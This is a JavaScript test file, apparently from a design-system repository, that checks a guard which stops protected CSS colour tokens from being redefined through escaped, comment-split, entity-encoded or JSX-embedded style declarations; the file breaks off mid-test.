import assert from "node:assert/strict";
import { mkdtemp, mkdir, readFile, rm, symlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import test from "node:test";
import ts from "typescript";
import {
  collectEmbeddedStyleSources,
  collectCssFiles,
  collectFirstPartyCssFiles,
  extractEmbeddedStyleSources,
  materialOwnershipErrors,
  parseCssDeclarations as guardParser,
  parseCssDefinitions,
  parseCssPropertyRegistrations,
  protectedMaterialTokens,
  protectedRegistrationErrors,
  timeOfDayCanvasOwnerErrors,
  workflowIntegrityErrors,
} from "../packages/champagne-guards/scripts/guard-surface-semantics.mjs";
import { unwrapStaticTypeScriptExpression } from "../packages/champagne-guards/scripts/surface-semantics-contract.v1.mjs";
import { parseCssDeclarations as sharedParser } from "../packages/champagne-tokens/scripts/css-declarations.v1.mjs";
import {
  GENERATED_CSS_RELATIVE_PATH as GC,
  GENERATED_TS_RELATIVE_PATH as GT,
  PRIMITIVES_RELATIVE_PATH as PR,
  SOURCE_RELATIVE_PATH as SR,
  checkGenerated,
  renderMaterial,
  stableStringify,
  writeGenerated,
} from "../packages/champagne-tokens/scripts/generate-critical-paint.v1.mjs";

const root = path.resolve(import.meta.dirname, "..");
const read = (file) => readFile(path.join(root, file), "utf8");
const source = JSON.parse(await read(SR));
const primitive = await read(PR);
const generated = await read(GC);
const tokens = await read("packages/champagne-tokens/styles/champagne/tokens.css");
const timeCss = await read("packages/champagne-tokens/styles/champagne/time-of-day.css");
const workflow = await read(".github/workflows/verify.yml");
const rendered = renderMaterial(source, primitive);
const protectedTokens = protectedMaterialTokens(source, rendered);
const clone = (value) => JSON.parse(JSON.stringify(value));
const escaped = (token) => `--\\${token[2].codePointAt(0).toString(16)} ${token.slice(3)}`;
const split = (token) => `${token.slice(0, 3)}/**/${token.slice(3)}`;
const baseline = (extra = []) => new Map([
  ["packages/champagne-tokens/styles/tokens/smh-champagne-tokens.css", primitive],
  ["packages/champagne-tokens/styles/champagne/canvas-material.generated.css", generated],
  ["packages/champagne-tokens/styles/champagne/tokens.css", tokens],
  ["packages/champagne-tokens/styles/champagne/time-of-day.css", timeCss],
  ...extra,
]);
const ownership = (css) => materialOwnershipErrors({
  cssSources: baseline([["apps/web/app/adversarial.module.css", css]]),
  materialSource: source,
  renderedMaterial: rendered,
}).join("\n");
const embeddedOwnership = (tsx, sourcePath = "apps/web/app/Adversarial.tsx") => {
  const styles = extractEmbeddedStyleSources(tsx, sourcePath);
  return {
    styles,
    issues: materialOwnershipErrors({
      cssSources: baseline([...styles]),
      materialSource: source,
      renderedMaterial: rendered,
    }).join("\n"),
  };
};

async function tempRepo(sourceValue = source, primitiveValue = primitive) {
  const dir = await mkdtemp(path.join(tmpdir(), "champagne-critical-paint-"));
  for (const file of [SR, PR, GC, GT]) await mkdir(path.dirname(path.join(dir, file)), { recursive: true });
  await writeFile(path.join(dir, SR), `${JSON.stringify(sourceValue, null, 2)}\n`);
  await writeFile(path.join(dir, PR), primitiveValue);
  return dir;
}

async function tempCollectorTree(t) {
  const dir = await mkdtemp(path.join(tmpdir(), "champagne-source-collector-"));
  t.after(() => rm(dir, { recursive: true, force: true }));
  return dir;
}

async function writeCollectorFixture(rootPath, relativePath, contents) {
  const file = path.join(rootPath, relativePath);
  await mkdir(path.dirname(file), { recursive: true });
  await writeFile(file, contents);
}

async function collectedCssResult(rootPath) {
  const entries = await Promise.all(
    collectCssFiles(rootPath, rootPath)
      .sort((left, right) => left.localeCompare(right))
      .map(async (file) => [path.relative(rootPath, file), await readFile(file, "utf8")]),
  );
  const styles = new Map(entries);
  return {
    styles,
    ownershipIssues: materialOwnershipErrors({
      cssSources: baseline([...styles]),
      materialSource: source,
      renderedMaterial: rendered,
    }).join("\n"),
    registrationIssues: protectedRegistrationErrors(styles, protectedTokens).join("\n"),
  };
}

async function collectedFirstPartyCssResult(repoPath) {
  const entries = await Promise.all(
    collectFirstPartyCssFiles(repoPath).map(async (file) => [
      path.relative(repoPath, file),
      await readFile(file, "utf8"),
    ]),
  );
  const styles = new Map(entries);
  return {
    styles,
    ownershipIssues: materialOwnershipErrors({
      cssSources: baseline([...styles]),
      materialSource: source,
      renderedMaterial: rendered,
    }).join("\n"),
    registrationIssues: protectedRegistrationErrors(styles, protectedTokens).join("\n"),
  };
}

function collectedEmbeddedResult(rootPath) {
  const styles = collectEmbeddedStyleSources(rootPath, rootPath);
  return {
    styles,
    ownershipIssues: materialOwnershipErrors({
      cssSources: baseline([...styles]),
      materialSource: source,
      renderedMaterial: rendered,
    }).join("\n"),
    registrationIssues: protectedRegistrationErrors(styles, protectedTokens).join("\n"),
  };
}

test("current material renders byte-stable loaded and critical outputs", () => {
  const first = renderMaterial(source, primitive);
  const second = renderMaterial(clone(source), primitive);
  assert.equal(first.css, second.css);
  assert.equal(first.ts, second.ts);
  assert.match(first.css, /--surface-canvas: var\(--brand-ink\)/);
  assert.match(first.ts, /export const champagneCriticalPaintCss/);
  assert.doesNotMatch(first.ts, /\bimport\s|\brequire\s*\(/);
  assert.deepEqual(first.documentStyle, {
    background: "var(--surface-canvas)",
    color: "var(--text-ink-high)",
  });
  assert.equal(Object.keys(first.documentStyle).some((key) => key.startsWith("--")), false);
});

test("semantic source changes alter both generated outputs", () => {
  const changed = clone(source);
  const canvas = changed.nodes.find((node) => node.id === "canvas");
  canvas.left.weight = 91;
  canvas.right.weight = 9;
  const before = renderMaterial(source, primitive);
  const after = renderMaterial(changed, primitive);
  assert.notEqual(after.css, before.css);
  assert.notEqual(after.ts, before.ts);
});

test("closed schema rejects unknown keys", () => {
  const changed = clone(source);
  changed.unexpected = true;
  assert.throws(() => renderMaterial(changed, primitive), /unknown key/);
});

test("material status and final-selection truth fail closed together", () => {
  const status = clone(source);
  status.status = "FINAL_PERSIAN_MIDNIGHT_SELECTED";
  assert.throws(() => renderMaterial(status, primitive), /MATERIAL_STATUS/);
  const selection = clone(source);
  selection.finalPersianMidnightSelection = true;
  assert.throws(() => renderMaterial(selection, primitive), /PERSIAN_MIDNIGHT_AUTHORITY/);
});

test("shared CSS parser authority remains a single implementation", () => {
  assert.equal(guardParser, sharedParser);
});

test("BROWSER_EFFECTIVE_OWNER: direct and escaped declarations are decoded", () => {
  const cases = [
    ":root{--surface-canvas:var(--surface-1)}",
    String.raw`:root{--surface-\63 anvas:var(--surface-1)}`,
    String.raw`:root{--\73 urface-canvas:var(--surface-1)}`,
    String.raw`:root{--surface\2d canvas:var(--surface-1)}`,
  ];
  for (const css of cases) {
    assert.deepEqual(parseCssDefinitions(css, "--surface-canvas"), ["var(--surface-1)"]);
  }
});

test("BROWSER_INVALID_SYNTAX: comment-separated names are conservatively rejected", () => {
  const css = ":root{--surface/**/-canvas:var(--surface-1)}";
  assert.deepEqual(parseCssDefinitions(css, "--surface-canvas"), ["var(--surface-1)"]);
  assert.match(ownership(css), /MATERIAL_OWNER_UNAPPROVED.*--surface-canvas/);
});

test("matched brace components and escaped closing braces cannot hide a later owner", () => {
  assert.deepEqual(
    parseCssDefinitions(":root{--decoy:{x:y};--surface-canvas:var(--surface-1)}", "--surface-canvas"),
    ["var(--surface-1)"],
  );
  assert.deepEqual(
    parseCssDefinitions(String.raw`:root{--decoy:{x:\};};--surface-canvas:var(--surface-1)}`, "--surface-canvas"),
    ["var(--surface-1)"],
  );
});

test("bad-string newline recovery cannot swallow a following owner", () => {
  assert.deepEqual(
    parseCssDefinitions(`:root{--decoy:"bad\n;--surface-canvas:var(--surface-1);/* " */}`, "--surface-canvas"),
    ["var(--surface-1)"],
  );
});

test("CONSERVATIVE_PARSER_REJECTION: malformed CSS fails closed", () => {
  assert.throws(
    () => sharedParser(":root{--decoy:calc((1px);}"),
    /unbalanced CSS component value|unbalanced CSS block/,
  );
  assert.match(ownership(":root{--surface-canvas:var(--surface-1);"), /CSS_DECLARATION_PARSE/);
  assert.match(ownership(":root{--surface-canvas:red;/*"), /CSS_DECLARATION_PARSE/);
});

test("every protected owner rejects direct, escaped and comment-separated competitors", () => {
  for (const token of protectedTokens) {
    for (const spelling of [token, escaped(token), split(token)]) {
      const issues = ownership(`:root{${spelling}:var(--surface-1)}`);
      assert.match(issues, new RegExp(`MATERIAL_OWNER_UNAPPROVED.*${token}`));
      assert.match(issues, /adversarial\.module\.css/);
    }
  }
});

test("literal primitives preserve exact ownership and parity", () => {
  const escapedOnly = primitive.replace("--ink:  #0B0D0F;", `${escaped("--ink")}: #0B0D0F;`);
  assert.notEqual(escapedOnly, primitive);
  assert.doesNotThrow(() => renderMaterial(source, escapedOnly));
  for (const node of source.nodes.filter((item) => item.type === "literal")) {
    const duplicate = `${primitive}\n:root{${escaped(node.token)}:${node.value}}`;
    assert.throws(
      () => renderMaterial(source, duplicate),
      (error) => error instanceof Error && error.message.includes(`[PRIMITIVE_OWNER_INVALID] ${node.token}`),
    );
  }
  assert.throws(() => renderMaterial(source, primitive.replace("#40C4B4", "#40C4B5")), /PRIMITIVE_DRIFT/);
});

test("generated owners, ink-100 and immutable gold remain in the protected set", () => {
  for (const token of [
    "--smh-ink-navy",
    "--brand-ink",
    "--surface-canvas",
    "--bg-ink",
    "--text-ink-high",
    "--ink-100",
    "--brand-gold",
    "--brand-gold-keyline",
  ]) {
    assert.equal(protectedTokens.has(token), true, token);
  }
});

test("only the three exact time-of-day canvas owners are accepted", () => {
  assert.deepEqual(timeOfDayCanvasOwnerErrors(timeCss), []);
  assert.match(
    timeOfDayCanvasOwnerErrors(`${timeCss}\n:root{--surface-canvas:var(--surface-1)}`).join("\n"),
    /TIME_OF_DAY_CANVAS_OWNERS/,
  );
  assert.match(
    timeOfDayCanvasOwnerErrors(`${timeCss}\n:root[data-theme='night']{--surface-canvas:var(--ink-100)}`).join("\n"),
    /TIME_OF_DAY_CANVAS_OWNERS/,
  );
});

test("protected @property registrations are inventoried through nested at-rules", () => {
  const cases = [
    "@property --surface-canvas{syntax:'<color>';inherits:false;initial-value:red}",
    String.raw`@property --\73 urface-canvas{syntax:'<color>';inherits:false;initial-value:red}`,
    String.raw`@property --surface-\63 anvas{syntax:'<color>';inherits:false;initial-value:red}`,
    "@layer material{@property --surface-canvas{syntax:'<color>';inherits:false;initial-value:red}}",
    "@supports(display:grid){@property --surface-canvas{syntax:'<color>';inherits:false;initial-value:red}}",
    "@media(min-width:1px){@property --surface-canvas{syntax:'<color>';inherits:false;initial-value:red}}",
  ];
  for (const css of cases) {
    const registrations = parseCssPropertyRegistrations(css);
    assert.equal(registrations[0]?.property, "--surface-canvas");
    const issues = protectedRegistrationErrors(
      new Map([["apps/web/app/adversarial.css", css]]),
      protectedTokens,
    ).join("\n");
    assert.match(issues, /MATERIAL_REGISTRATION_UNAPPROVED.*--surface-canvas/);
  }
});

test("ambiguous or malformed protected registrations fail closed", () => {
  const ambiguous = "@property --surface/**/-canvas{syntax:'<color>';inherits:false;initial-value:red}";
  assert.match(
    protectedRegistrationErrors(new Map([["x.css", ambiguous]]), protectedTokens).join("\n"),
    /MATERIAL_REGISTRATION_UNAPPROVED.*ambiguous spelling/,
  );
  assert.match(
    protectedRegistrationErrors(new Map([["x.css", "@property --surface-canvas;"]]), protectedTokens).join("\n"),
    /CSS_REGISTRATION_PARSE/,
  );
});

test("unprotected @property registrations remain permitted", () => {
  const css = "@property --component-progress{syntax:'<number>';inherits:false;initial-value:0}";
  assert.deepEqual(protectedRegistrationErrors(new Map([["x.css", css]]), protectedTokens), []);
});

test("benign ordinary embedded styles preserve provenance and pass ownership", () => {
  const result = embeddedOwnership(
    "const View = () => <style>{`.safe{color:var(--text-high)}`}</style>;",
    "apps/web/app/Benign.tsx",
  );
  assert.equal(result.styles.size, 1);
  const [[provenance, css]] = [...result.styles];
  assert.match(provenance, /^apps\/web\/app\/Benign\.tsx:\d+:\d+ <style>$/);
  assert.equal(css, ".safe{color:var(--text-high)}");
  assert.equal(result.issues, "");
  assert.throws(
    () => extractEmbeddedStyleSources("const View = () => <style>{`broken`}</style", "Broken.tsx"),
    /\[EMBEDDED_STYLE_SOURCE_PARSE\] Broken\.tsx:/,
  );
});

test("ordinary JSX style text uses TypeScript-cooked benign text", () => {
  const literal = embeddedOwnership("const View = () => <style>plain CSS text</style>;");
  assert.equal([...literal.styles.values()][0], "plain CSS text");
  assert.equal(literal.issues, "");

  const entityBraces = embeddedOwnership(
    "const View = () => <style>.safe&#123;color:red&#125;</style>;",
  );
  assert.equal([...entityBraces.styles.values()][0], ".safe{color:red}");
  assert.equal(entityBraces.issues, "");
});

test("decimal JSX entities expose protected ordinary style owners", () => {
  const result = embeddedOwnership(
    "const View = () => <style>:root &#123; --surface-&#99;anvas:red; &#125;</style>;",
  );
  assert.equal([...result.styles.values()][0], ":root { --surface-canvas:red; }");
  assert.match(result.issues, /MATERIAL_OWNER_UNAPPROVED.*--surface-canvas/);
});

test("hexadecimal JSX entities expose protected ordinary style owners", () => {
  const result = embeddedOwnership(
    "const View = () => <style>:root &#x7B; --surface-&#x63;anvas:red; &#x7D;</style>;",
  );
  assert.equal([...result.styles.values()][0], ":root { --surface-canvas:red; }");
  assert.match(result.issues, /MATERIAL_OWNER_UNAPPROVED.*--surface-canvas/);
});

test("named JSX entities follow TypeScript cooking before CSS ownership", () => {
  const result = embeddedOwnership(
    "const View = () => <style>:root &gt; * &#123; --surface-canvas:red; &#125;</style>;",
  );
  assert.equal([...result.styles.values()][0], ":root > * { --surface-canvas:red; }");
  assert.match(result.issues, /MATERIAL_OWNER_UNAPPROVED.*--surface-canvas/);
});

test("entity-encoded protected registrations are rejected", () => {
  const result = embeddedOwnership(
    "const View = () => <style>&#64;property --surface-&#99;anvas&#123;syntax:'&lt;color&gt;';inherits:false;initial-value:red&#125;</style>;",
  );
  assert.equal(
    [...result.styles.values()][0],
    "@property --surface-canvas{syntax:'<color>';inherits:false;initial-value:red}",
  );
  assert.match(result.issues, /MATERIAL_REGISTRATION_UNAPPROVED.*--surface-canvas/);
});

test("mixed raw and entity-cooked ordinary CSS remains governed", () => {
  const result = embeddedOwnership(
    "const View = () => <style>:root &#123; --surface-canvas:var(--surface-1); color:red; &#125;</style>;",
  );
  assert.equal(
    [...result.styles.values()][0],
    ":root { --surface-canvas:var(--surface-1); color:red; }",
  );
  assert.match(result.issues, /MATERIAL_OWNER_UNAPPROVED.*--surface-canvas/);
});

test("malformed and unsupported JSX entities remain literal like TypeScript", () => {
  const cases = [
    ["&champagneUnknown;", "&champagneUnknown;"],
    ["&#xZZ;", "&#xZZ;"],
    ["&#99", "&#99"],
    ["&#X63;", "&#X63;"],
  ];
  for (const [encoded, expected] of cases) {
    const result = embeddedOwnership(
      `const View = () => <style>:root &#123; --surface-${encoded}anvas:red; &#125;</style>;`,
    );
    assert.equal(
      [...result.styles.values()][0],
      `:root { --surface-${expected}anvas:red; }`,
    );
    assert.equal(result.issues, "");
  }
});

test("unsafe numeric JSX entity code points fail closed or preserve protected ownership", () => {
  assert.throws(
    () =>
      extractEmbeddedStyleSources(
        "const View = () => <style>:root &#123; --surface-canvas:red; &#x110000;</style>;",
        "apps/web/app/OutOfRange.tsx",
      ),
    /\[EMBEDDED_STYLE_ENTITY_DECODE\] apps\/web\/app\/OutOfRange\.tsx:/,
  );

  for (const encoded of ["&#xD800;", "&#0;"]) {
    const result = embeddedOwnership(
      `const View = () => <style>:root &#123; --surface-canvas:red; ${encoded} &#125;</style>;`,
    );
    assert.match(result.issues, /MATERIAL_OWNER_UNAPPROVED.*--surface-canvas/);
  }
});

test("ordinary embedded styles reject protected material owners", () => {
  const result = embeddedOwnership(
    "const View = () => <style>{`:root{--surface-canvas:red}`}</style>;",
  );
  assert.match(result.issues, /MATERIAL_OWNER_UNAPPROVED.*--surface-canvas/);
  assert.match(result.issues, /Adversarial\.tsx:\d+:\d+ <style>/);
});

test("dangerouslySetInnerHTML embedded styles reject protected material owners", () => {
  const result = embeddedOwnership(
    'const View = () => <style dangerouslySetInnerHTML={{__html: ":root{--bg-ink:red}"}} />;',
  );
  assert.match(result.issues, /MATERIAL_OWNER_UNAPPROVED.*--bg-ink/);
});

test("enumerated literal __html property names reject protected material owners", () => {
  const cases = [
    'const View = () => <style dangerouslySetInnerHTML={{ __html: ":root{--surface-canvas:red}" }} />;',
    'const View = () => <style dangerouslySetInnerHTML={{ "__html": ":root{--surface-canvas:red}" }} />;',
    "const View = () => <style dangerouslySetInnerHTML={{ '__html': ':root{--surface-canvas:red}' }} />;",
    'const View = () => <style dangerouslySetInnerHTML={{ ["__html"]: ":root{--surface-canvas:red}" }} />;',
    "const View = () => <style dangerouslySetInnerHTML={{ ['__html']: ':root{--surface-canvas:red}' }} />;",
    'const View = () => <style dangerouslySetInnerHTML={{ [`__html`]: ":root{--surface-canvas:red}" }} />;',
  ];
  for (const fixture of cases) {
    const result = embeddedOwnership(fixture);
    assert.equal(result.styles.size, 1);
    assert.match(result.issues, /MATERIAL_OWNER_UNAPPROVED.*--surface-canvas/);
  }
});

test("transparent wrappers around computed literal __html names remain governed", () => {
  const result = embeddedOwnership(
    'const View = () => <style dangerouslySetInnerHTML={{ [(("__html" as const) satisfies string)!]: ":root{--surface-canvas:red}" }} />;',
  );
  assert.equal(result.styles.size, 1);
  assert.match(result.issues, /MATERIAL_OWNER_UNAPPROVED.*--surface-canvas/);
});

test("computed literal __html names reject protected property registrations", () => {
  const result = embeddedOwnership(
    "const View = () => <style dangerouslySetInnerHTML={{ [`__html`]: \"@property --surface-canvas{syntax:'<color>';inherits:false;initial-value:red}\" }} />;",
  );
  assert.equal(result.styles.size, 1);
  assert.match(result.issues, /MATERIAL_REGISTRATION_UNAPPROVED.*--surface-canvas/);
});

test("benign computed literal embedded CSS remains permitted", () => {
  const result = embeddedOwnership(
    'const View = () => <style dangerouslySetInnerHTML={{ ["__html"]: ".safe{color:var(--text-high)}" }} />;',
  );
  assert.equal(result.styles.size, 1);
  assert.equal(result.issues, "");
});

test("unsupported computed property expressions are unresolved and never executed", () => {
  const concatenated = embeddedOwnership(
    'const View = () => <style dangerouslySetInnerHTML={{ ["__" + "html"]: ":root{--surface-canvas:red}" }} />;',
  );
  assert.equal(concatenated.styles.size, 0);
  assert.equal(concatenated.issues, "");

  delete globalThis.__champagneStyleExecuted;
  const executable = embeddedOwnership(
    'const View = () => <style dangerouslySetInnerHTML={{ [(globalThis.__champagneStyleExecuted = "__html")]: ":root{--surface-canvas:red}" }} />;',
  );
  assert.equal(executable.styles.size, 0);
  assert.equal(executable.issues, "");
  assert.equal(globalThis.__champagneStyleExecuted, undefined);
});

test("embedded styles reject escaped protected material owners", () => {
  const result = embeddedOwnership(
    'const View = () => <style dangerouslySetInnerHTML={{__html: ":root{--surface-\\\\63 anvas:red}"}} />;',
  );
  assert.match(result.issues, /MATERIAL_OWNER_UNAPPROVED.*--surface-canvas/);
});

test("embedded styles reject comment-separated protected material owners", () => {
  const result = embeddedOwnership(
    'const View = () => <style dangerouslySetInnerHTML={{__html: ":root{--surface/**/-canvas:red}"}} />;',
  );
  assert.match(result.issues, /MATERIAL_OWNER_UNAPPROVED.*--surface-canvas/);
});

test("embedded styles reject protected property registrations", () => {
  const result = embeddedOwnership(
    "const View = () => <style>{`@property --surface-canvas{syntax:'<color>';inherits:false;initial-value:red}`}</style>;",
  );
  assert.match(result.issues, /MATERIAL_REGISTRATION_UNAPPROVED.*--surface-canvas/);
});

test("static embedded property names remain governed across dynamic template values", () => {
  const result = embeddedOwnership(
    "const color = 'red'; const View = () => <style>{`:root{--surface-canvas:${color}}`}</style>;",
  );
  assert.match(result.issues, /MATERIAL_OWNER_UNAPPROVED.*--surface-canvas/);
  assert.match([...result.styles.values()][0], /var\(--champagne-embedded-style-expression\)/);
});

test("parenthesized dangerous style objects remain governed", () => {
  const result = embeddedOwnership(
    'const View = () => <style dangerouslySetInnerHTML={({ __html: ":root{--surface-canvas:red}" })} />;',
  );
  assert.match(result.issues, /MATERIAL_OWNER_UNAPPROVED.*--surface-canvas/);
});

test("dangerous style objects wrapped with as expressions remain governed", () => {
  const result = embeddedOwnership(
    'const View = () => <style dangerouslySetInnerHTML={({ __html: ":root{--surface-canvas:red}" }) as any} />;',
  );
  assert.match(result.issues, /MATERIAL_OWNER_UNAPPROVED.*--surface-canvas/);
});

test("dangerous style objects wrapped with satisfies preserve protected registrations", () => {
  const result = embeddedOwnership(
    "const View = () => <style dangerouslySetInnerHTML={{ __html: \"@property --surface-canvas{syntax:'<color>';inherits:false;initial-value:red}\" } satisfies { __html: string }} />;",
  );
  assert.match(result.issues, /MATERIAL_REGISTRATION_UNAPPROVED.*--surface-canvas/);
});

test("angle-bracket type assertions unwrap in TypeScript expression syntax", () => {
  const sourceFile = ts.createSourceFile(
    "assertion.ts",
    'const css = <string>":root{--surface-canvas:red}";',
    ts.ScriptTarget.Latest,
    true,
    ts.ScriptKind.TS,
  );
  assert.equal(sourceFile.parseDiagnostics.length, 0);
  const statement = sourceFile.statements[0];
  assert.equal(ts.isVariableStatement(statement), true);
  const expression = statement.declarationList.declarations[0]?.initializer;
  const normalized = unwrapStaticTypeScriptExpression(expression);
  assert.equal(ts.isStringLiteral(normalized), true);
  assert.match(ownership(normalized.text), /MATERIAL_OWNER_UNAPPROVED.*--surface-canvas/);
});

test("nested transparent wrappers on ordinary style children remain governed", () => {
  const result = embeddedOwnership(
    "const View = () => <style>{((`:root{--surface-canvas:red}` as const) satisfies string)!}</style>;",
  );
  assert.match(result.issues, /MATERIAL_OWNER_UNAPPROVED.*--surface-canvas/);
});

test("wrapped __html string values remain governed", () => {
  const result = embeddedOwnership(
    'const View = () => <style dangerouslySetInnerHTML={{ __html: (":root{--surface-canvas:red}" as const) }} />;',
  );
  assert.match(result.issues, /MATERIAL_OWNER_UNAPPROVED.*--surface-canvas/);
});

test("benign wrapped embedded CSS remains permitted", () => {
  const result = embeddedOwnership(
    'const View = () => <style dangerouslySetInnerHTML={(({ __html: ".safe{color:var(--text-high)}" } satisfies { __html: string }) as { __html: string })!} />;',
  );
  assert.equal(result.styles.size, 1);
  assert.equal(result.issues, "");
});

test("dynamic embedded expressions remain outside the claim and are not executed", () => {
  delete globalThis.__champagneStyleExecuted;
  const result = embeddedOwnership(
    "const View = () => <style dangerouslySetInnerHTML={(globalThis.__champagneStyleExecuted = true, { __html: ':root{--surface-canvas:red}' })} />;",
  );
  assert.equal(result.styles.size, 0);
  assert.equal(result.issues, "");
  assert.equal(globalThis.__champagneStyleExecuted, undefined);
});

test("first-party .js, .jsx and .tsx JSX style sources share the finite extractor", async (t) => {
  const dir = await tempCollectorTree(t);
  const fixtures = new Map([
    ["Safe.js", "export const View = () => <style>{`.safe{color:var(--text-high)}`}</style>;\n"],
    ["Owner.js", "export const View = () => <style>{`:root{--surface-canvas:red}`}</style>;\n"],
    [
      "Registration.js",
      "export const View = () => <style>{`@property --surface-canvas{syntax:'<color>';inherits:false;initial-value:red}`}</style>;\n",
    ],
    ["Safe.jsx", "export const View = () => <style>{`.safe{color:var(--text-high)}`}</style>;\n"],
    ["Safe.tsx", "export const View = () => <style>{`.safe{color:var(--text-high)}`}</style>;\n"],
    ["Ignored.test.js", "export const View = () => <style>{`:root{--surface-canvas:red}`}</style>;\n"],
    ["Ignored.spec.jsx", "export const View = () => <style>{`:root{--surface-canvas:red}`}</style>;\n"],
    ["tests/Ignored.js", "export const View = () => <style>{`:root{--surface-canvas:red}`}</style>;\n"],
    ["__tests__/Ignored.tsx", "export const View = () => <style>{`:root{--surface-canvas:red}`}</style>;\n"],
  ]);
  for (const [relativePath, contents] of fixtures) {
    await writeCollectorFixture(dir, relativePath, contents);
  }

  const result = collectedEmbeddedResult(dir);
  const collected = [...result.styles.keys()].map((provenance) => provenance.split(":")[0]);
  assert.deepEqual(collected, ["Owner.js", "Registration.js", "Safe.js", "Safe.jsx", "Safe.tsx"]);
  assert.match(result.ownershipIssues, /MATERIAL_OWNER_UNAPPROVED.*--surface-canvas/);
  assert.match(result.registrationIssues, /MATERIAL_REGISTRATION_UNAPPROVED.*--surface-canvas/);
});

test("ordinary JSX primitive literal children follow the finite React text contract", () => {
  for (const literal of ["null", "false", "true"]) {
    const result = embeddedOwnership(
      `const View = () => <style>:root &#123; --surface{${literal}}-canvas:red &#125;</style>;`,
    );
    assert.equal([...result.styles.values()][0], ":root { --surface-canvas:red }");
    assert.match(result.issues, /MATERIAL_OWNER_UNAPPROVED.*--surface-canvas/);
  }

  const numeric = embeddedOwnership(
    "const View = () => <style>:root &#123; --ink-{100}:red &#125;</style>;",
  );
  assert.equal([...numeric.styles.values()][0], ":root { --ink-100:red }");
  assert.match(numeric.issues, /MATERIAL_OWNER_UNAPPROVED.*--ink-100/);

  const bigint = embeddedOwnership(
    "const View = () => <style>:root &#123; --ink-{0x64n}:red &#125;</style>;",
  );
  assert.equal([...bigint.styles.values()][0], ":root { --ink-100:red }");
  assert.match(bigint.issues, /MATERIAL_OWNER_UNAPPROVED.*--ink-100/);

  const nestedArray = embeddedOwnership(
    'const View = () => <style>{[":root{--surface-", , [null, false, 100n, "canvas:red}"]]}</style>;',
  );
  assert.equal(
    [...nestedArray.styles.values()][0],
    ":root{--surface-100canvas:red}",
  );
  assert.equal(nestedArray.issues, "");

  const protectedArray = embeddedOwnership(
    'const View = () => <style>{[":root{--surface-", [null, "canvas", false], ":red}"]}</style>;',
  );
  assert.equal([...protectedArray.styles.values()][0], ":root{--surface-canvas:red}");
  assert.match(protectedArray.issues, /MATERIAL_OWNER_UNAPPROVED.*--surface-canvas/);

  const benign = embeddedOwnership(
    "const View = () => <style>.safe&#123;margin:{1_000}px&#125;</style>;",
  );
  assert.equal([...benign.styles.values()][0], ".safe{margin:1000px}");
  assert.equal(benign.issues, "");

  for (const unresolved of ["undefined", "void 0", "-1", "-100n", "themeColor"]) {
    const result = embeddedOwnership(
      `const View = () => <style>.safe&#123;color:{${unresolved}}&#125;</style>;`,
    );
    assert.match(
      [...result.styles.values()][0],
      /var\(--champagne-embedded-style-expression\)/,
    );
  }
});

test("static children props share the finite React child normalisation authority", () => {
  const cases = [
    {
      label: "quoted raw text",
      path: "packages/example/Children.js",
      fixture: 'const View=()=> <style children=".safe{color:red}"/>;',
      css: ".safe{color:red}",
    },
    {
      label: "quoted decimal entities",
      fixture: 'const View=()=> <style children=".safe&#123;color:red&#125;"/>;',
      css: ".safe{color:red}",
    },
    {
      label: "quoted hexadecimal entities",
      fixture: 'const View=()=> <style children=".safe&#x7B;color:red&#x7D;"/>;',
      css: ".safe{color:red}",
    },
    {
      label: "quoted named entities",
      fixture:
        'const View=()=> <style children=".safe&#123;content:\'&gt;&amp;\'&#125;"/>;',
      css: ".safe{content:'>&'}",
    },
    {
      label: "quoted unknown entity",
      fixture:
        'const View=()=> <style children=".safe&#123;content:\'&champagneUnknown;\'&#125;"/>;',
      css: ".safe{content:'&champagneUnknown;'}",
    },
    {
      label: "quoted malformed entity",
      fixture:
        'const View=()=> <style children=".safe&#123;content:\'&#xZZ;\'&#125;"/>;',
      css: ".safe{content:'&#xZZ;'}",
    },
    {
      label: "quoted encoded protected owner",
      fixture:
        'const View=()=> <style children=":root&#123;--surface-&#99;anvas:red&#125;"/>;',
      css: ":root{--surface-canvas:red}",
      issue: /MATERIAL_OWNER_UNAPPROVED.*--surface-canvas/,
    },
    {
      label: "quoted encoded protected registration",
      fixture:
        'const View=()=> <style children="&#64;property --surface-&#99;anvas&#123;syntax:\'&lt;color&gt;\';inherits:false;initial-value:red&#125;"/>;',
      css: "@property --surface-canvas{syntax:'<color>';inherits:false;initial-value:red}",
      issue: /MATERIAL_REGISTRATION_UNAPPROVED.*--surface-canvas/,
    },
    {
      label: "double-quoted expression string",
      path: "packages/example/Children.jsx",
      fixture:
        'const View=()=> <style children={":root{--surface-canvas:red}"}/>;',
      css: ":root{--surface-canvas:red}",
      issue: /MATERIAL_OWNER_UNAPPROVED.*--surface-canvas/,
    },
    {
      label: "single-quoted expression string",
      fixture:
        "const View=()=> <style children={':root{--surface-canvas:red}'}/>;",
      css: ":root{--surface-canvas:red}",
      issue: /MATERIAL_OWNER_UNAPPROVED.*--surface-canvas/,
    },
    {
      label: "no-substitution template",
      fixture:
        "const View=()=> <style children={`@property --surface-canvas{syntax:'<color>';inherits:false;initial-value:red}`}/>;",
      css: "@property --surface-canvas{syntax:'<color>';inherits:false;initial-value:red}",
      issue: /MATERIAL_REGISTRATION_UNAPPROVED.*--surface-canvas/,
    },
    {
      label: "dynamic template placeholder",
      fixture:
        "const color='red';const View=()=> <style children={`:root{--surface-canvas:${color}}`}/>;",
      issue: /MATERIAL_OWNER_UNAPPROVED.*--surface-canvas/,
      placeholder: true,
    },
    {
      label: "transparent TypeScript wrappers",
      fixture:
        'const View=()=> <style children={((":root{--surface-canvas:red}" as const) satisfies string)!}/>;',
      css: ":root{--surface-canvas:red}",
      issue: /MATERIAL_OWNER_UNAPPROVED.*--surface-canvas/,
    },
    { label: "null", fixture: "const View=()=> <style children={null}/>;", css: "" },
    { label: "true", fixture: "const View=()=> <style children={true}/>;", css: "" },
    { label: "false", fixture: "const View=()=> <style children={false}/>;", css: "" },
    { label: "number", fixture: "const View=()=> <style children={100}/>;", css: "100" },
    { label: "BigInt", fixture: "const View=()=> <style children={0x64n}/>;", css: "100" },
    {
      label: "static array",
      fixture:
        'const View=()=> <style children={[":root{--surface-", "canvas:red}"]}/>;',
      css: ":root{--surface-canvas:red}",
      issue: /MATERIAL_OWNER_UNAPPROVED.*--surface-canvas/,
    },
    {
      label: "static array with BigInt",
      fixture: 'const View=()=> <style children={[":root{--ink-", 0x64n, ":red}"]}/>;',
      css: ":root{--ink-100:red}",
      issue: /MATERIAL_OWNER_UNAPPROVED.*--ink-100/,
    },
    {
      label: "nested static array with a hole",
      fixture:
